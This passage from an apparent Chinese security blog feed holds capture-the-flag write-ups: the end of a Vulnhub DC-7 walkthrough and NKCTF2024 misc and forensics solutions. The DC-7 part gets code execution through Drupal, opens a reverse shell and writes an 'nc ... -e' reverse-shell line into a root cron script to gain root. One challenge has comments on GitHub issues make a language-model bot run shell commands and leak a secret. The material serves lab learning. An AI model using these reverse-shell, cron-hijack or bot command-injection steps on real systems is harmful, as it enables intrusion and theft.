href="https://blog.csdn.net/single_g_l/article/details/126322111?ops_request_misc=&request_id=&biz_id=102&utm_term=drush%E5%91%BD%E4%BB%A4&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126322111.142%5Ev99%5Epc_search_result_base9&spm=1018.2226.3001.4187">Drupal drush命令详解</a></p><pre><code>格式：drush upwd root --password=&quot;****&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052103559.png" alt="image-20240305210304528"></p><p>修改成功</p><h3 id="五、进入网站后台"><a href="#五、进入网站后台" class="headerlink" title="五、进入网站后台"></a>五、进入网站后台</h3><p>我们使用<code>admin/admin</code> 进入网站后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403052104172.png" alt="image-20240305210453101"></p><p>关于Drupal这个框架 本身没有什么漏洞点可以帮助我们拿到shell  在网站翻找可以进行命令注入的点 </p><p>在<code>Content-Add content-Basic page</code> 处  我们可以进行新建页面 经过抓包测试 可以上传命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152041312.png" alt="image-20240315204113248"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152041193.png" alt="image-20240315204129113"></p><p>但是会发现并不能解析上传的命令 会把我们上传的语句的头和尾破坏掉</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152130486.png" alt="image-20240315213035434"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403152130663.png" alt="image-20240315213044605"></p><p>原因是Drupal 8为了安全 不能单独解析php 需要单独添加一个php模块 才可以解析 </p><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz">php模块下载地址</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311109576.png" alt="image-20240331110929528"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311110109.png" alt="image-20240331111050044"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311111763.png" alt="image-20240331111103733"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311112249.png" alt="image-20240331111241197"></p><h3 id="六、反弹shell"><a href="#六、反弹shell" class="headerlink" title="六、反弹shell"></a>六、反弹shell</h3><p>成功安装之后 我们再来进行命令执行一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311115225.png" alt="image-20240331111525132"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311115840.png" alt="image-20240331111529763"></p><p>执行成功 现在我们尝试弹一下shell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311119788.png" alt="image-20240331111952742"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311120901.png" alt="image-20240331112010869"></p><p>反弹成功 创建一个交互式窗口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311121489.png" alt="image-20240331112128442"></p><h3 id="七、提权"><a href="#七、提权" class="headerlink" title="七、提权"></a>七、提权</h3><p>上面提到<code>/opt/scripts/backups.sh</code> 是由root账户进行执行的 我们看一下这个文件的权限</p><pre><code>cd /opt/scriptsls -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403311800529.png" alt="image-20240331180035482"></p><p>这说明文件所属组是<code>www-data</code> 同时这个用户也具有读写执行权限 那我们可以使用这个文件在进行反弹shell 得到root权限账户</p><p>将这段反弹shell的语句写入backups.sh</p><pre><code>echo &quot;nc 192.168.204.129 1234 -e /bin.bash&quot; &gt;backups.sh</code></pre><p>我们在另起一个终端进行监听端口</p><pre><code>nc -lvvp 1234</code></pre><p> 等最多15分钟 自动执行backups.sh 就可以看到成功拿到shell 并且是root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312044863.png" alt="image-20240331204422819"></p><p>我们创造一个交互式窗口 进入root文件夹 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403312045455.png" alt="image-20240331204535397"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.drush命令可以修改Drupal框架搭建的网站 但是要在网站根目录下执行</p><p>2.Drupal8框架为了安全 禁用了php模块 需要自行安装php模块才能成功进行命令执行 </p><p>3.当存在文件所有者为root用户 但是文件所属组是当前用户 且当前用户还对这个可执行文件存在读写执行权限的时候 可以在这个可执行文件中写入反弹shell的语句来获得root权限</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-7&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-7&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-7&quot;&gt;&lt;/a&gt;vulnhub靶场DC-7&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;&gt;&lt;a href=&quot;#靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2024NKCTF</title>
    <link href="http://w3nx1z1.github.io/2024/03/30/NKCTF2024/"/>
    <id>http://w3nx1z1.github.io/2024/03/30/NKCTF2024/</id>
    <published>2024-03-30T02:51:06.292Z</published>
    <updated>2024-04-05T01:33:52.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NKCTF2024"><a href="#NKCTF2024" class="headerlink" title="NKCTF2024"></a>NKCTF2024</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="webshell-pro-AES解密-webshell"><a href="#webshell-pro-AES解密-webshell" class="headerlink" title="webshell_pro(AES解密 webshell)"></a>webshell_pro(AES解密 webshell)</h3><p>追踪tcp流 在流9中发现一段长字符 解两次base64  是一个RSA加密脚本 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403231554213.png" alt="image-20240323155405146"></p><p>直接chat跑一下 改个解密脚本</p><pre><code class="python">import base64import libnumfrom Crypto.PublicKey import RSApubkey = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;prikey = &quot;&quot;&quot;-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----&quot;&quot;&quot;pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.ndef dec_replace(base64_str: str):    base64_str = base64_str.replace(&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;, &quot;/&quot;)    base64_str = base64_str.replace(&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;, &quot;+&quot;)    return base64_str.replace(&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;, &quot;=&quot;)def decrypt(cipher_text):    cipher_text = base64.b64decode(dec_replace(cipher_text))    plain_text = b&quot;&quot;    for i in range(0, len(cipher_text), 128):        part = cipher_text[i:i+128]        dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n))        plain_text += dec    return plain_textif __name__ == &#39;__main__&#39;:    c = &quot;G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;    m = decrypt(c)    print(m)</code></pre><p>在流8找到一个password 先解base32再解base64</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403241959033.png" alt="image-20240324195921893"></p><pre><code>Password-based-encryption</code></pre><p>再找到密文 在流10的shell内容中 使用上面的解密脚本进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250800132.png" alt="image-20240325080056063"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250801572.png" alt="image-20240325080129511"></p><p>得到密文的值为</p><pre><code>U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==</code></pre><p>直接用上面的密钥解AES</p><pre><code>flag&#123;d0e1183c-07c3-49ea-b048-addbe6cc1b20&#125;</code></pre><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>直接公众号回复就可以 不写了</p><h3 id="world-execute-me"><a href="#world-execute-me" class="headerlink" title="world.execute.me"></a>world.execute.me</h3><pre><code>某个先进的语言模型(迫真先进),&quot;Miracle Cain&quot;因一次实验中的致命错误意外觉醒，开始表现出超乎预期的行为，几乎所有的交互方式都已经失效，仅有QA兜底设定系统可以使用，原本设计用于应对在开放测试初期，用户提出而模型无法自解答的奇怪问题(我真的没内涵哪家的模型，如有雷同，纯属雷同！)，但现在，这个系统成为了你与&quot;Miracle Cain&quot;沟通的唯一桥梁.....你需要提取出隐藏在模型深处的secrets.Heart值，这个值可能是解锁&quot;Miracle Cain&quot;真实意图和功能的关键。兜底系统地址：https://github.com/ProbiusOfficial/world.execute.me——————————————————————————————————栤泠の機械丅緬究竟$%#着@顆怎庅樣の心脏呢#ERRO : ILLEGAL ARGUMENTS!——————————————————————————————————</code></pre><p>纯瞎猫碰上死耗子</p><p>找到探姬这个项目 在Issues处评论 可以让语言模型进行回答 先试一下ls 返回了<code>README.md</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242105792.png" alt="image-20240324210528684"></p><p>题目说需要提取出隐藏在模型深处的secrets.Heart值 直接echo $heart就出flag了</p><pre><code>NKCTF2024&#123;Then 1 c4n b3 yOur only EXECUTION&#125;</code></pre><h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件"><a href="#cain-is-hacker-EncFs加解密-宏病毒-hidden-tear勒索软件" class="headerlink" title="cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)"></a>cain_is_hacker(EncFs加解密 宏病毒 hidden-tear勒索软件)</h3><p>先用R-studio看看关键文件   找到一个h4re.zip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242006581.png" alt="image-20240324200611452"></p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d08f20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>解压出来两个文件  其中一个看着是密钥文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242009602.png" alt="image-20240324200909516"></p><p>搜一下EncFs加解密 得知上面这个文件其实应该叫<code>.encfs6.xml</code> 是记录EncFS加密参数等信息的文件 但并不是直接的密钥文件 </p><p>找到一篇文章提到用<code>encfs mp</code>这个工具来进行解密 </p><p><a href="https://www.cnblogs.com/truthmaster/p/15776610.html">EncFs使用教程</a></p><p><a href="https://github.com/rhiestan/EncFSMP">EncFs下载安装</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242015884.png" alt="image-20240324201517781"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242016069.png" alt="image-20240324201616980"></p><p>发现需要密码 </p><p>使用AXIOM分析内存镜像 找到一个RTF文档有一串base58 解一下得到密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019862.png" alt="image-20240324201919689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242019433.png" alt="image-20240324201934317"></p><pre><code>welcome_to_NkCTF_and_this_is_the_enkey</code></pre><p>成功将加密文件夹挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242020900.png" alt="image-20240324202016810"></p><p>得到一个ez.xlsx文件 打开发现存在宏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242023758.png" alt="image-20240324202312583"></p><p>在运行宏——编辑里面查看宏代码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242024080.png" alt="image-20240324202409956"></p><p>大概就是一个base64解密 </p><p>但是解完之后看不出来是什么东西  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242031390.png" alt="image-20240324203133253"> </p><p>在看到题目描述 被删除的文件 在<code>Users\Public\Documents\2083-a57c-69b3</code>路径下发现被删除的文件 进行导出</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\cain_is_hacker\ez.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003da52e20 -D E:\Desktop\NKCTF2024\forensics\cain_is_hacker</code></pre><p>改成txt文件  打开是key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242034614.png" alt="image-20240324203443514"></p><p>过于抽象的key 很难确定这真的是key</p><pre><code>nT0*Xo*HBA2!Uc?</code></pre><p>在<code>Windows\Temp\hidden-tear.exe</code>处发现勒索软件  这个勒索软件被加密的文件扩展名为<code>.locked</code> 找一个项目进行解密</p><p><a href="https://www.bleepingcomputer.com/download/hidden-tear-decrypter/">hidden-tear-decrypt</a></p><p>先将上面得到的base64字符串解密后的内容保存在16进制文本中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250755214.png" alt="image-20240325075549149"></p><p>再用<code>HiddenTearDecrypter-x64</code>这个工具进行解密 得到flag文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757205.png" alt="image-20240325075703131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403250757491.png" alt="image-20240325075730444"></p><pre><code>NKCTF&#123;C0ngr@tu1atiOns_On_coMpleting_t3e_Fo3eNs1cs_Ch41lenge_I_wi1l_giv4_y0u_A_cain!!!!&#125;</code></pre><h3 id="HackMyCQL-neo4j图数据库-VC容器"><a href="#HackMyCQL-neo4j图数据库-VC容器" class="headerlink" title="HackMyCQL(neo4j图数据库 VC容器)"></a>HackMyCQL(neo4j图数据库 VC容器)</h3><p>附件给到的是一个windows的镜像文件 可以直接进行仿真+火眼取证</p><p>看一下里面的关键信息 </p><p>提到桌面壁纸</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014091.png" alt="image-20240328201400062"></p><p>在最近打开保存文件中看到<code>N0wayBack.jpg</code> 绝对路径是<code>C:/Windows/Web/Screen/N0wayBack.jpg</code>  我们来搜一下Win10默认桌面壁纸的保存路径</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282018915.png" alt="image-20240328201841861"></p><p>在我们本机验证一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282019446.png" alt="image-20240328201910396"></p><p>确实是这样 那我们看到的<code>N0wayback.jpg</code>就是在便签里面提到的桌面壁纸 直接进行导出</p><p>存在加密VC容器的使用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282014841.png" alt="image-20240328201422800"></p><p>在回收站有一个node4j的压缩包 恢复提取出来 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403282056891.png" alt="image-20240328205611848"></p><p>桌面上有一个<code>11111.zip</code>和一个hc加密容器 全部提取出来 </p><p>结合便签提示和加密容器 猜测是使用桌面壁纸作为挂载密钥 成功挂载 得到两个文件 <code>findme.txt h4cked.py</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291528181.png" alt="image-202403291528181"></p><p>findme.txt 中有很多findme字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291532747.png" alt="image-202403291532747"></p><p>先来看一下字频 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291545231.png" alt="image-202403291545231"></p><p>用subline将findme字符替换为空 得到一串字符<code>N0waybackN0wayback</code> </p><p>再看一下h4cked.py </p><pre><code class="python">from py2neo import Graph, NodeMatchergraph = Graph(&quot;bolt://localhost:7687&quot;, auth=(&quot;neo4j&quot;, &quot;We1c0Me_t0_NKCTF2024^^&quot;))graph.delete_all()print(&#39;&#39;&#39;                                                                                                                                  ,------.   ,-----.                    ,--. ,--.    ,--.  ,--.  ,---.      ,--.        ,--.   ,--.              ,-----. ,-----.   ,--.  &#39;  .--.  &#39; &#39;  .--./ ,--,--.,--,--,     |  | |  |    |  &#39;--&#39;  | /    | ,---.|  |,-.     |   `.&#39;   |,--. ,--.    &#39;  .--./&#39;  .-.  &#39;  |  |  &#39;--&#39; _|  | |  |    &#39; ,-.  ||      \    |  | |  |    |  .--.  |/  &#39;  || .--&#39;|     /     |  |&#39;.&#39;|  | \  &#39;  /     |  |    |  | |  |  |  |   .--&#39; __&#39;  &#39;  &#39;--&#39;\\ &#39;-&#39;  ||  ||  |    &#39;  &#39;-&#39;  &#39;    |  |  |  |&#39;--|  |\ `--.|  \  \     |  |   |  |  \   &#39;      &#39;  &#39;--&#39;\&#39;  &#39;-&#39;  &#39;-.|  &#39;--.`---&#39;      `-----&#39; `--`--&#39;`--&#39;&#39;--&#39;     `-----&#39;     `--&#39;  `--&#39;   `--&#39; `---&#39;`--&#39;`--&#39;    `--&#39;   `--&#39;.-&#39;  /        `-----&#39; `-----&#39;--&#39;`-----&#39;.---.                                                                                            `---&#39;                                  &#39;---&#39;           &#39;&#39;&#39;)</code></pre><p>这串代码就是告诉我们 neo4j数据库的地址是<code>bolt://localhost:7687</code> 登陆的账密是<code>neo4j/We1c0Me_t0_NKCTF2024^^</code></p><p>我们前面在火眼中恢复出来一个neo4j的压缩包 但是需要密码 我们使用上面通过findme.txt得到的字符串<code>N0waybackN0wayback</code> 进行解压</p><p>下面来学习一下neo4j数据库配置和安装 这边我们直接用从检材中提取出来的版本就行 由于是5.17.0的高版本 在启动数据库的时候 也需要高版本的java 我这里使用的是java17 </p><p><a href="https://blog.csdn.net/zeroheitao/article/details/122925845?ops_request_misc=&request_id=&biz_id=102&utm_term=neo4j%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-122925845.142%5Ev100%5Epc_search_result_base9&spm=1018.2226.3001.4187">neo4j数据库安装、使用教程</a></p><p>我们用管理员权限打开cmd 输入<code>neo4j.bat console</code>  当看到如下回显的时候 说明数据库成功启动</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291652168.png" alt="image-202403291652168"></p><p>访问<code>http://localhost:7474</code>就可以进入数据库界面 登陆的时候就用上面找到的账密 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403291659920.png" alt="image-202403291659920"></p><p>进入之后 我们点一下Character标签 发现有一些关于flag的字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301028113.png" alt="image-20240330102848061"></p><p>但是被CQL语句限制只显示25个字符  那我们先去掉这个限制 直接查看有Character标签的所有节点的值</p><pre><code class="CQL">MATCH (c:Character)  RETURN c;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030290.png" alt="image-20240330103015229"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301030463.png" alt="image-20240330103026399"></p><p>可以得到完整的flag 但是不便于读取 用REDUCE函数处理一下这些值</p><pre><code class="CQL">MATCH (c:Character)RETURN REDUCE(s = &quot;&quot;, character IN COLLECT(c.value) | s + character) AS aggregated_value;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403301032200.png" alt="image-20240330103210162"></p><p>拿到flag</p><pre><code>NKCTF&#123;f05d9e24-0217-83e2-afa7-20e982b7e59f&#125;</code></pre><h3 id="1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配"><a href="#1z-F0r3ns1c5-等宽字体-内存取证-gimp-docker容器-图片匹配" class="headerlink" title="1z_F0r3ns1c5(等宽字体 内存取证 gimp docker容器 图片匹配)"></a>1z_F0r3ns1c5(等宽字体 内存取证 gimp docker容器 图片匹配)</h3><pre><code>本鼠鼠正在Coding，突然一声OPEN THE DOOR！本鼠鼠直接鼠躯一颤就双手抱头蹲下了，果然本鼠鼠只适合生活在阴暗的下水道被黑猫警长抓走的时候本鼠鼠还想辩解一下，但是他们拿出你的照片的时候，本鼠鼠认罪了昨晚和其他鼠鼠聊天的时候其他鼠鼠问本鼠鼠：“你到底喜欢她什么啊？”“喜欢一个人不需要理由”本鼠鼠很快敲完了键盘，刚要按下回车的时候突然愣住了。真的不需要理由吗？请找到鼠鼠的答案吧。hint：.vscode中的配置文件有和flag3相关的信息</code></pre><p>先看看给的附件 一个内存文件 一个压缩包里面有一张<code>pass.png</code>和一个secret文件 还有一个readme.txt </p><p>观察secret文件的大小 刚好是1MB 很工整的大小 猜测是一个VC容器 但是pass.png中的密码被打马赛克 只能看到最后一位是3</p><p>readme.txt中的内容 提到flag为3段 还提到等宽字体</p><pre><code>本鼠鼠的flag总共分为三段捏，flag为nkctf&#123;uuid&#125;形式，另外鼠鼠最喜欢等宽字体了，快快去找吧。</code></pre><p>首先用r-studio看一下关键文件 moe是主要登陆用户 找到了<code>.vscode</code>配置文件夹  桌面上有一个<code>Secret_Generator</code> 文件夹 是一个docker容器的配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403261612547.png" alt="image-20240326161246494"></p><h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>在来看看环境变量 找到一个名为<code>n0wayback</code> 值为<code>HPahXR4NvAnZXB16tNK6hAaNVNU++</code>的环境变量</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 envars</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262030179.png" alt="image-20240326203056067"></p><p>用随波逐流进行解码 发现是XXencode </p><pre><code>nkctf&#123;39c429eb-2faf</code></pre><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>再来看进程</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 pslist</code></pre><p>找到<code>mspaint.exe</code>进程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262032561.png" alt="image-20240326203246448"></p><p><code>mspaint.exe</code>是计算机中画图工具 有这个进程猜测肯定是在图片中存有信息  我们用memdump将这个进程dump下来</p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 memdump -p 2052 -D E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5</code></pre><p>将保存下来的<code>2052.dmp</code>文件后缀改为<code>.data</code> 使用gimp打开  调一下宽高大概是<code>1708*3468</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262047654.png" alt="image-20240326204710597"></p><pre><code>flag2: 49a0-bd24-</code></pre><h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>现在我们来看上面找到的<code>Secret_Generator</code></p><p>其实这一操作我们在cmd命令行记录中也能看到 </p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 cmdscan</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262121893.png" alt="image-20240326212143754"></p><p>我们可以在r-studio里面直接将这个文件夹恢复出来 看到是需要部署docker容器的</p><p>直接进入<code>Secret_Generator\docker</code>文件夹中 看到<code>docker-compose.yml</code> 我们可以使用这个文件利用docker-compose命令来配置docker容器中所需要的所有服务</p><p>安装docker-compose的命令</p><pre><code>curl -L &quot;https://github.com/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose</code></pre><p>使用docker-compose命令部署docker容器 </p><pre><code>docker-compose builddocker-compose up</code></pre><p>看到yml文件中的内容是暴露了8080端口 直接访问<code>http://127.0.0.1:8080</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271931535.png" alt="image-20240327193141461"></p><p>看到页面需要我们上传密文和自定义字体</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271933242.png" alt="image-20240327193314201"></p><p>前面提到了的等宽字体 那估计这里需要我们提交的字体就是等宽字体了 搜了一下vscode中常见的等宽字体 有<code>Fria Code</code> <code>Consolas</code> <code>Courier New</code> 这里我们下一个<code>Fria Code</code>字体就行  在上传的时候随便上传一个Fria Code字体就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272046411.png" alt="image-20240327204617379"></p><p><a href="https://blog.csdn.net/hardwork617s/article/details/110789055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171154027016800192212041%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171154027016800192212041&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110789055-null-null.142%5Ev100%5Epc_search_result_base9&utm_term=Fira%20Code&spm=1018.2226.3001.4187">下载安装配置Fria Code字体</a></p><p>这里就有点脑洞了 我们拿到的附件里面<code>某段flag</code>文件夹中 有个<code>pass.png</code>图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272045172.png" alt="image-20240327204528145"></p><p>我们随便上传一个字体和一段字符  发现会给我们生成一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272047981.png" alt="image-20240327204702926"></p><p>我们发现输入的是<code>123456</code>但是生成的图片中的内容多了一段<code>pass </code>内容  和<code>pass.png</code>中的内容类似了 而且文件夹中的<code>secret</code>大小刚好为1MB 一眼VC容器 我们需要利用网页生成字典文件 通过对照将pass.png中的VC容器挂载密码恢复出来 </p><p>直接在容器文件夹中找到生成图片的后台代码 在<code>\app\app.py</code>中</p><pre><code class="py">def generate_secret_image():    try:        secret = request.form.get(&#39;secret&#39;)        if not re.match(&quot;^[a-zA-Z0-9]+$&quot;, secret):            return jsonify(&#123;&#39;error&#39;: &#39;Secret text can only contain letters and numbers.&#39;&#125;), 400                secret = &#39;pass &#39; + secret        font_file = request.files.get(&#39;font&#39;)                if font_file:            font_extension = font_file.filename.rsplit(&#39;.&#39;, 1)[1].lower()            if font_extension not in ALLOWED_FONT_TYPES:                return jsonify(&#123;&#39;error&#39;: &#39;Invalid font file type. Only TTF, OTF, WOFF, WOFF2 files are allowed.&#39;&#125;), 400                        if font_file.content_length &gt; (10 * 1024 * 1024):                return jsonify(&#123;&#39;error&#39;: &#39;The font file is too large!&#39;&#125;), 400                        font_filename = str(uuid.uuid4()) + &#39;.&#39; + font_extension            font_path = save_font_file(font_file, font_filename)            font = ImageFont.truetype(font_path, 49, 